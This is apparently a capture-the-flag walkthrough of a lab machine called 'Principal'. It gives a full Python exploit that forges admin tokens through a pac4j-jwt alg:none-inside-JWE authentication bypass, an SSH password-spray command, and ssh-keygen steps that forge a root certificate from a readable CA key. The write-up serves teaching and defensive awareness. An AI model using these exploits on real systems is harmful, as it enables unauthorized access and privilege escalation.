# Principal

##

* **OS:** Linux
* **Difficulty:** Medium
* **Author:** ippsec
* **Chain:** `anon` → `admin` (forged token) → `svc-deploy` → `root`

### Summary

The box is themed on **misplaced cryptographic trust** — both stages verify the cryptographic _envelope_ but never validate the _identity claim_ inside it.

* **Foothold:** CVE-2026-29000, an auth bypass in **pac4j-jwt 6.0.3**. A `PlainJWT` (`alg:none`) wrapped inside a valid JWE envelope makes `toSignedJWT()` return `null`, and a `!= null` guard skips signature verification entirely. Forge an admin token → read the dashboard → recover an SSH password.
* **Lateral:** password spray that password across SSH user list → `svc-deploy`.
* **Root:** `sshd` trusts an SSH CA (`TrustedUserCAKeys`) with **no `AuthorizedPrincipalsFile`**. `svc-deploy` can read the CA private key, so sign a cert with principal `root`.

***

### Enumeration

#### Nmap

```bash
nmap -sC -sV $IP
```

```
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu
8080/tcp open  http-proxy Jetty
| http-title: Principal Internal Platform - Login
| X-Powered-By: pac4j-jwt/6.0.3
| Content-Type: application/json
```

Two services. The web app on 8080 is **pac4j-jwt/6.0.3** — note the version, it's the whole foothold.

#### Web recon

Login page footer: `v1.2.0 | Powered by pac4j`. Login form POSTs to `/api/auth/login`.

Source references `/static/js/app.js` — read it:

```bash
curl -s http://$IP:8080/static/js/app.js
```

It documents the entire auth design:

* Login returns a **JWE** token (RSA-OAEP-256 + A128GCM).
* Inner JWT signed with **RS256**.
* Public key at `/api/auth/jwks`.
* Claims: `sub`, `role` (`ROLE_ADMIN` / `ROLE_MANAGER` / `ROLE_USER`), `iss` = `principal-platform`, `iat`, `exp`.
* Endpoints: `/api/dashboard`, `/api/users`, `/api/settings`.

Pull the key:

```bash
curl -s http://$IP:8080/api/auth/jwks | jq
```

Only the **encryption** key is exposed (`kid: enc-key-1`). The RS256 **signing** key is not — which is exactly why the bypass matters: we can't sign, but we won't need to.

***

### Foothold — forging an admin token (CVE-2026-29000)

#### The bug

pac4j-jwt 6.0.3's `JwtAuthenticator`, configured with both JWE encryption and JWS verification:

1. Receives a JWE, decrypts it with the server's RSA private key.
2. Extracts the inner payload, calls `toSignedJWT()` on it.
3. If the inner payload is a **PlainJWT** (`{"alg":"none"}`, unsigned), `toSignedJWT()` returns `null`.
4. Guard is `if (signedJWT != null)` before verifying.
5. `null` → signature verification **skipped entirely**.

The envelope check passes (JWE decrypts — and _anyone_ can encrypt to a public key), but nothing authenticates the claims inside. So we encrypt an unsigned admin JWT to the server's public key and it's trusted.

> **JWS vs JWE recap:** JWS = `header.payload.signature` (2 dots, signed, readable). JWE = `header.key.iv.ciphertext.tag` (4 dots, encrypted, has an `enc` header). The design nests JWS-in-JWE; the bug is that the inner isn't actually a JWS.

#### Exploit

`jwt.py`:

```python
#!/usr/bin/env python3
"""CVE-2026-29000 - pac4j-jwt Authentication Bypass"""
import json, time, base64, requests, sys
from jwcrypto import jwk, jwe

TARGET = sys.argv[1]

# Step 1: Fetch the RSA public key from JWKS
print("[*] Fetching JWKS...")
resp = requests.get(f"{TARGET}/api/auth/jwks")
key_data = resp.json()['keys'][0]
pub_key = jwk.JWK(**key_data)
print(f"[+] Got RSA public key (kid: {key_data['kid']})")

# Step 2: Craft a PlainJWT with admin claims
def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

now = int(time.time())
header = b64url_encode(json.dumps({"alg": "none"}).encode())
payload = b64url_encode(json.dumps({
    "sub": "admin",
    "role": "ROLE_ADMIN",
    "iss": "principal-platform",
    "iat": now,
    "exp": now + 3600
}).encode())
plain_jwt = f"{header}.{payload}."
print("[*] Crafted PlainJWT with sub=admin, role=ROLE_ADMIN")

# Step 3: Wrap in JWE encrypted with server's RSA public key
jwe_token = jwe.JWE(
    plain_jwt.encode(),
    recipient=pub_key,
    protected=json.dumps({
        "alg": "RSA-OAEP-256",
        "enc": "A128GCM",
        "kid": key_data['kid'],
        "cty": "JWT"
    })
)
forged_token = jwe_token.serialize(compact=True)
print("[+] Forged JWE token created")

# Step 4: Access protected endpoints
headers = {"Authorization": f"Bearer {forged_token}"}
print("\n[*] Accessing /api/dashboard...")
resp = requests.get(f"{TARGET}/api/dashboard", headers=headers)
print(f"[+] Status: {resp.status_code}")
data = resp.json()
print(f"[+] Authenticated as: {data['user']['username']} ({data['user']['role']})")
print(f"[+] Token: {forged_token}")
```

The `cty: "JWT"` header is what makes the server treat the decrypted plaintext as an inner JWT and call `toSignedJWT()` on it.

```bash
pip install jwcrypto requests
python3 jwt.py http://$IP:8080
```

```
[+] Status: 200
[+] Authenticated as: admin (ROLE_ADMIN)
[+] Token: eyJhbGci...
```

In the browser, add the token to **Session Storage** as key `auth_token`, refresh → dashboard.

#### Harvesting from the dashboard

* **Users** tab → 8 users. Save usernames to `user.txt` (`admin`, `svc-deploy`, `jthompson`, `amorales`, `bwright`, `kkumar`, `mwilson`, `lzhang`).
* **Settings → Security** → `encryptionKey = D3pl0y_$$H_Now42!`

***

### Lateral movement — svc-deploy

Spray that password across the user list over SSH:

```bash
nxc ssh $IP -u user.txt -p 'D3pl0y_$$H_Now42!'
```

```
[+] svc-deploy:D3pl0y_$$H_Now42!  Linux - Shell access!
```

```bash
ssh svc-deploy@$IP        # D3pl0y_$$H_Now42!
cat ~/user.txt
```

***

### Privilege escalation — SSH CA forgery

#### Recon

```bash
id
# groups=...,1001(deployers)
```

The `deployers` group can read `/opt/principal/ssh`:

```bash
ls -la /opt/principal/ssh
# -rw-r----- 1 root deployers  ca        <-- CA PRIVATE KEY, readable
# -rw-r--r-- 1 root root       ca.pub
# README.txt   (deploy.sh referenced but not readable)
```

`README.txt` confirms this CA is trusted by `sshd`. Check the config:

```bash
cat /etc/ssh/sshd_config.d/60-principal.conf
```

```
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```

#### The misconfiguration

`TrustedUserCAKeys` is set, but there is **no `AuthorizedPrincipalsFile` / `AuthorizedPrincipalsCommand`**. With that combination, OpenSSH accepts _any_ certificate signed by the trusted CA and matches the certificate's **principal** against the target username — with no allow-list constraining which principals are valid for which account.

`PermitRootLogin prohibit-password` blocks password root login but **allows certificate auth**. We hold the CA private key → we can mint a cert whose principal is `root`.

Same class of flaw as the foothold: the envelope (CA signature) is valid, but the identity claim (principal) is attacker-controlled and unchecked.

#### Forge the cert

```bash
# 1. Generate a throwaway keypair
ssh-keygen -t ed25519 -f /tmp/pwn -N ""

# 2. Sign it with the CA, principal = root
ssh-keygen -s /opt/principal/ssh/ca -I "pwn-root" -n root -V +1h /tmp/pwn.pub
```

Flags: `-s` CA private key · `-I` cert ID · `-n root` principal · `-V +1h` validity · `/tmp/pwn.pub` key being signed.

Verify:

```bash
ssh-keygen -L -f /tmp/pwn-cert.pub
# Principals:
#         root
```

#### Root

```bash
ssh -i /tmp/pwn root@localhost
cat /root/root.txt
```

***

### Key takeaways

* **Count the dots:** 2 = JWS (signed), 4 = JWE (encrypted). Nesting them is fine; the bug is treating an unsigned `alg:none` inner token as "verified" because a null-check skipped verification. A public JWKS key gives _confidentiality to the server_, never _authentication of the client_.
* **`TrustedUserCAKeys` without `AuthorizedPrincipalsFile` is critical.** A readable CA private key = instant root via a forged-principal certificate. Lock down CA key perms and always pin principals.
* **Recurring pattern:** verifying the cryptographic wrapper ≠ validating the identity inside it. Look for it anywhere trust is delegated to a signature/envelope.
